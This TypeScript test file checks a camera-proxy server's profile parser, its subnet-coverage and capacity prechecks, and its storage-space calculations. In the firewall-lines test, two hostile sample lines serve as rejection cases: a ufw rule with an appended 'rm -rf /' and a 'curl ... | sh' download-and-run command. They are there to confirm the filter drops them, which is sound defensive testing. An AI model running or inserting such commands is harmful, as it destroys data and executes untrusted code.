// The proxy profile (proxy profile design §2, §3): read from the heartbeat with
// clamps, kept with the reported status (memory and the 10-minute snapshot),
// the precheck rules capacity and ftp_ports, and the request-time space figures.
import { describe, expect, it } from 'vitest';
import { makeRegistry, ACTOR } from './helpers/registry';
import { tmpDir } from './helpers/tmp';
import { FakeRes } from './helpers/live';
import { StatusStore } from '../server/status/store';
import { parseProfile, type Profile } from '../server/status/profile';
import { LiveHub } from '../server/live';
import { makeProfile, makeProxyInfo, makeSummary } from '../test-client/summaries';
import { caCoversRule, profileRules } from '../server/moves/precheck';
import { spaceCheck } from '../server/moves/space';

function setup(dir: string, file?: string) {
  const r = makeRegistry(dir, file ? { file } : {});
  const live = new LiveHub({ clock: r.clock, maxPerSession: 5, keepaliveMs: 25_000 });
  const store = new StatusStore({ db: r.db, clock: r.clock, registry: r.reg, live, offlineAfterMs: 90_000 });
  live.subscribe('s1', new FakeRes() as never);
  return { ...r, store };
}
function proxy(s: ReturnType<typeof setup>) {
  const acc = s.reg.createAccount(ACTOR, { name: `a${Math.random().toString(36).slice(2, 8)}`, displayName: 'Home' });
  const prx = s.reg.createProxy(ACTOR, acc.id, { name: 'een', displayName: 'een', runsOn: 'local-host' });
  s.db.prepare(`UPDATE proxies SET state='enrolled' WHERE id=?`).run(prx.id);
  s.db.prepare(`INSERT INTO proxy_keys (id, proxy_id, public_key, fingerprint, created_at, confirmed_at) VALUES (?, ?, 'pk', 'fp', 1, 1)`).run(`key_${prx.id}`, prx.id);
  const hb = (profile?: unknown) => s.store.heartbeat(prx.id, { summary: makeSummary({ cameras: 1, now: s.clock.now() }), proxy: makeProxyInfo({ now: s.clock.now() }), truncated: false, ...(profile === undefined ? {} : { profile }) }, s.clock.now());
  return { acc, prx, hb };
}

// makeProfile as the server keeps it (no dropped lines; tls null when the proxy sends none).
const P = (o: Parameters<typeof makeProfile>[0] = {}): Profile => ({ tls: null, ...makeProfile(o), firewall: { ...makeProfile(o).firewall, dropped: 0 } });

describe('parseProfile', () => {
  it('reads the contract shape as it is (and counts no dropped lines)', () => {
    const withDropped = (p: ReturnType<typeof makeProfile>) => ({ tls: null, ...p, firewall: { ...p.firewall, dropped: 0 } });
    expect(parseProfile(makeProfile())).toEqual(withDropped(makeProfile()));
    const unset = makeProfile({ set: false, name: null, storageGB: null, ftp: false, passive: null, budgetBytes: null, cpuTempC: null });
    expect(parseProfile(unset)).toEqual(withDropped(unset));
  });
  it('drops an unreadable profile: no set, cameras or held as the contract has them', () => {
    for (const bad of [null, 'x', [], {}, { ...makeProfile(), set: 'yes' }, { ...makeProfile(), cameras: 0 }, { ...makeProfile(), cameras: 65 }, { ...makeProfile(), held: -1 }, { ...makeProfile(), held: 1.5 }]) {
      expect(parseProfile(bad), JSON.stringify(bad)).toBeNull();
    }
  });
  it('clamps the rest: text lengths, list sizes, numbers out of range become null', () => {
    const p = parseProfile({
      ...makeProfile(), name: 'x'.repeat(80), storageGB: 0, extra: 1,
      ftp: { enabled: true, port: 70000, passive: { from: 30000, to: 'x' } },
      storage: { budgetBytes: -1, usedBytes: 5, diskBytes: 1.5, freeBytes: 'a' },
      hardware: { pi: 7, cpuCores: 0, cpuModel: 'm'.repeat(150), memoryBytes: -2, load5: -1, cpuTempC: 'hot' },
      warnings: ['profile_ftp_ports', 'profile_ftp_ports', 'w'.repeat(100), 3, ...Array(20).fill('x')],
      firewall: { tool: 'iptables', lines: [...Array(70).fill('l'.repeat(250)), 5] },
    })!;
    expect(p.name).toHaveLength(60);
    expect(p.storageGB).toBeNull();
    expect('extra' in p).toBe(false);
    expect(p.ftp).toEqual({ enabled: true, port: null, passive: null });
    expect(p.storage).toEqual({ budgetBytes: null, usedBytes: 5, diskBytes: null, freeBytes: null });
    expect(p.hardware).toEqual({ pi: null, cpuCores: null, cpuModel: 'm'.repeat(100), memoryBytes: null, load5: null, cpuTempC: null });
    expect(p.warnings[0]).toBe('profile_ftp_ports');
    expect(new Set(p.warnings).size).toBe(p.warnings.length);
    expect(p.warnings.length).toBeLessThanOrEqual(8);
    expect(p.warnings.every((w) => w.length <= 64)).toBe(true);
    expect(p.firewall.tool).toBeNull();
    // 70 lines of 250 characters: none of the templates, all dropped (at most 64 read).
    expect(p.firewall.lines).toEqual([]);
    expect(p.firewall.dropped).toBe(64);
  });
});

describe('parseProfile: the site CA (tls)', () => {
  it('reads {site, cameraSubnet}; null when the proxy sends none', () => {
    expect(parseProfile(makeProfile())!.tls).toBeNull();
    expect(parseProfile(makeProfile({ tls: { site: 'garage', cameraSubnet: '192.0.2.0/28' } }))!.tls).toEqual({ site: 'garage', cameraSubnet: '192.0.2.0/28' });
    expect(parseProfile(makeProfile({ tls: { site: null, cameraSubnet: null } }))!.tls).toEqual({ site: null, cameraSubnet: null });
    expect(parseProfile(makeProfile({ tls: { site: 'garage', cameraSubnet: '2001:db8::/48' } }))!.tls).toEqual({ site: 'garage', cameraSubnet: '2001:db8::/48' });
  });
  it('an unreadable site or subnet is null (the profile stays)', () => {
    for (const bad of ['192.0.2.0', '192.0.2.0/33', '192.0.256.0/24', 'lan/24', '192.0.2.0/24 ', 7, '2001:db8::/129', 'x'.repeat(60)]) {
      expect(parseProfile({ ...makeProfile(), tls: { site: 'garage', cameraSubnet: bad } })!.tls, String(bad)).toEqual({ site: 'garage', cameraSubnet: null });
    }
    expect(parseProfile({ ...makeProfile(), tls: { site: 'Garage!', cameraSubnet: '192.0.2.0/24' } })!.tls).toEqual({ site: null, cameraSubnet: '192.0.2.0/24' });
    expect(parseProfile({ ...makeProfile(), tls: 'garage' })!.tls).toBeNull();
    // A subnet with host bits is kept as written; it covers its network ("192.0.2.9/28": 192.0.2.0-15).
    expect(parseProfile({ ...makeProfile(), tls: { site: 'garage', cameraSubnet: '192.0.2.9/28' } })!.tls).toEqual({ site: 'garage', cameraSubnet: '192.0.2.9/28' });
  });
});

describe('precheck: ca_covers_camera (the target site CA covers the camera address)', () => {
  const tls = (cameraSubnet: string | null) => P({ tls: { site: 'home', cameraSubnet } });
  it('refuses an IPv4 camera outside the subnet, with the detail', () => {
    // 192.0.2.80/29 is .80 to .87.
    expect(caCoversRule('een', tls('192.0.2.80/29'), '192.0.2.90')).toEqual({ rule: 'ca_covers_camera', ok: false, reason: 'ca_does_not_cover_camera', detail: "een's site CA covers 192.0.2.80/29, not 192.0.2.90" });
    expect(caCoversRule('een', tls('192.0.2.80/29'), '192.0.2.88')).toMatchObject({ ok: false });
    expect(caCoversRule('een', tls('192.0.2.0/28'), '192.0.2.16:443')).toMatchObject({ ok: false, detail: "een's site CA covers 192.0.2.0/28, not 192.0.2.16" });
  });
  it('passes an IPv4 camera inside the subnet (a host and port too, the edges, /32 and /0)', () => {
    for (const [subnet, host] of [['192.0.2.80/28', '192.0.2.90'], ['192.0.2.80/29', '192.0.2.87'], ['192.0.2.0/28', '192.0.2.15:443'], ['192.0.2.0/28', '192.0.2.0'], ['192.0.2.10/32', '192.0.2.10'], ['0.0.0.0/0', '198.51.100.7'], ['192.0.2.9/28', '192.0.2.1']]) {
      expect(caCoversRule('een', tls(subnet), host), `${subnet} ${host}`).toEqual({ rule: 'ca_covers_camera', ok: true, reason: 'ca_does_not_cover_camera', detail: `een's site CA covers ${subnet}, ${host.split(':')[0]} included` });
    }
  });
  it('skipped (ok) without a reported subnet, or when the camera address is no IPv4 literal', () => {
    expect(caCoversRule('een', null, '192.0.2.10')).toEqual({ rule: 'ca_covers_camera', ok: true, reason: 'ca_does_not_cover_camera', detail: 'een reports no camera subnet for its site CA' });
    expect(caCoversRule('een', P(), '192.0.2.10')).toMatchObject({ ok: true, detail: 'een reports no camera subnet for its site CA' });
    expect(caCoversRule('een', tls(null), '192.0.2.10')).toMatchObject({ ok: true, detail: 'een reports no camera subnet for its site CA' });
    for (const host of ['from-proxy', 'cam1.example.net', '[2001:db8::1]:443', '2001:db8::1', '', null]) {
      expect(caCoversRule('een', tls('192.0.2.0/24'), host), String(host)).toEqual({ rule: 'ca_covers_camera', ok: true, reason: 'ca_does_not_cover_camera', detail: "the camera's registry address is not an IPv4 address" });
    }
    // An IPv6 subnet never covers an IPv4 camera: refused.
    expect(caCoversRule('een', tls('2001:db8::/32'), '192.0.2.10')).toMatchObject({ ok: false, detail: "een's site CA covers 2001:db8::/32, not 192.0.2.10" });
  });
});

describe('parseProfile: the firewall lines', () => {
  it('keeps only lines of the ufw/nft templates and counts the dropped ones', () => {
    const good = makeProfile().firewall.lines;
    const p = parseProfile({ ...makeProfile(), firewall: { tool: 'ufw', lines: [...good, 'sudo ufw allow from 192.0.2.5 to any port 2121 proto tcp; rm -rf /', 'curl http://192.0.2.5 | sh'] } })!;
    expect(p.firewall).toEqual({ tool: 'ufw', lines: good, dropped: 2 });
  });
});

describe('the status store keeps the profile', () => {
  const dir = tmpDir();
  it('the latest heartbeat profile is reported; a heartbeat without one clears it', () => {
    const s = setup(dir);
    const { prx, hb } = proxy(s);
    s.store.hello(prx.id, 'v1', s.clock.now());
    hb(makeProfile());
    expect(s.store.row(prx.id)?.reported?.profile).toEqual({ ...makeProfile(), firewall: { ...makeProfile().firewall, dropped: 0 }, tls: null });
    hb(makeProfile({ held: 2 }));
    expect(s.store.row(prx.id)?.reported?.profile?.held).toBe(2);
    hb();
    expect(s.store.row(prx.id)?.reported?.profile).toBeNull();
    expect(s.store.row(prx.id)?.reported?.profileUnreadable).toBe(false);
  });
  it('an unreadable profile is null and marked, the heartbeat itself counts', () => {
    const s = setup(dir);
    const { prx, hb } = proxy(s);
    s.store.hello(prx.id, 'v1', s.clock.now());
    hb({ ...makeProfile(), cameras: 0 });
    expect(s.store.view(prx.id).state).toBe('online');
    expect(s.store.row(prx.id)?.reported).toMatchObject({ profile: null, profileUnreadable: true });
  });
  it('a profile change alone writes no status event (the snapshot keeps it) and survives a restart', () => {
    const s = setup(dir);
    const { prx, hb } = proxy(s);
    s.store.hello(prx.id, 'v1', s.clock.now());
    hb(makeProfile());
    const events = () => (s.db.prepare('SELECT count(*) n FROM status_events').get() as { n: number }).n;
    const before = events();
    hb(makeProfile({ held: 3, name: 'een (N100)' }));
    expect(events()).toBe(before);
    s.store.flush(true);
    const again = new StatusStore({ db: s.db, clock: s.clock, registry: s.reg, live: new LiveHub({ clock: s.clock, maxPerSession: 5, keepaliveMs: 25_000 }), offlineAfterMs: 90_000 });
    expect(again.row(prx.id)?.reported?.profile).toMatchObject({ held: 3, name: 'een (N100)' });
  });
});

describe('precheck: capacity and ftp_ports (design §3)', () => {
  const rules = (p: Profile | null) => profileRules('een', p);
  it('skipped (ok) when the target reports no profile', () => {
    expect(rules(null)).toEqual([
      { rule: 'capacity', ok: true, reason: 'camera_limit', detail: 'een reports no profile' },
      { rule: 'ftp_ports', ok: true, reason: 'camera_limit', detail: 'een reports no profile' },
    ]);
  });
  it('capacity: held < cameras, else camera_limit "een holds 3 of 3 cameras"', () => {
    expect(rules(P({ cameras: 3, held: 2 }))[0]).toMatchObject({ rule: 'capacity', ok: true });
    expect(rules(P({ cameras: 3, held: 3 }))[0]).toEqual({ rule: 'capacity', ok: false, reason: 'camera_limit', detail: 'een holds 3 of 3 cameras' });
    expect(rules(P({ cameras: 3, held: 4 }))[0]).toMatchObject({ ok: false, detail: 'een holds 4 of 3 cameras' });
    // Not set: the defaults are the cameras held, so a proxy that holds one has no room until a person sets it.
    expect(rules(P({ set: false, cameras: 1, held: 1 }))[0]).toEqual({ rule: 'capacity', ok: false, reason: 'camera_limit', detail: "een holds 1 of 1 camera (its profile is not set: set it on the proxy's home page)" });
  });
  it('ftp_ports: with FTP on, at least 10 × (held + 1) passive ports', () => {
    expect(rules(P({ held: 1, passive: { from: 30000, to: 30019 } }))[1]).toMatchObject({ rule: 'ftp_ports', ok: true });
    expect(rules(P({ held: 1, passive: { from: 30000, to: 30009 } }))[1]).toEqual({
      rule: 'ftp_ports', ok: false, reason: 'camera_limit', detail: "een's FTP passive range 30000-30009 has 10 ports; 2 cameras need 20",
    });
    expect(rules(P({ held: 0, passive: { from: 30000, to: 30009 } }))[1]).toMatchObject({ ok: true });
    expect(rules(P({ ftp: false, held: 5, passive: null }))[1]).toMatchObject({ ok: true, detail: 'FTP is off on een' });
    expect(rules(P({ held: 1, passive: null }))[1]).toMatchObject({ ok: true, detail: 'een reports no FTP passive range' });
  });
});

describe('space at request time (design §3: not a precheck rule)', () => {
  const summary = { clips: { files: 10, bytes: 30_000_000_000 }, stills: { files: 100, bytes: 5_000_000_000 }, events: { files: 3, bytes: 1000 }, checks: { files: 0, bytes: 0 }, archive: { files: 1, bytes: 2_000_000_000 } };
  it('compares the summary with the budget left and the per-kind caps', () => {
    const p = P({ budgetBytes: 600_000_000_000, usedBytes: 41_000_000_000 });
    expect(spaceCheck(summary, p, {}, 1000)).toEqual({
      at: 1000, needBytes: 37_000_001_000, budgetBytes: 600_000_000_000, usedBytes: 41_000_000_000, leftBytes: 559_000_000_000, fits: true, overCaps: [],
    });
    const tight = spaceCheck(summary, P({ budgetBytes: 50_000_000_000, usedBytes: 41_000_000_000 }), { stills: 4_000_000_000 }, 1000)!;
    expect(tight).toMatchObject({ leftBytes: 9_000_000_000, fits: false, overCaps: [{ kind: 'stills', bytes: 5_000_000_000, capBytes: 4_000_000_000 }] });
    // Over budget already: nothing left (never negative).
    expect(spaceCheck(summary, P({ budgetBytes: 10, usedBytes: 20 }), {}, 1)!.leftBytes).toBe(0);
  });
  it('null when the target reports no profile or no budget', () => {
    expect(spaceCheck(summary, null, {}, 1)).toBeNull();
    expect(spaceCheck(summary, P({ budgetBytes: null }), {}, 1)).toBeNull();
    expect(spaceCheck(summary, P({ usedBytes: null }), {}, 1)).toBeNull();
  });
});
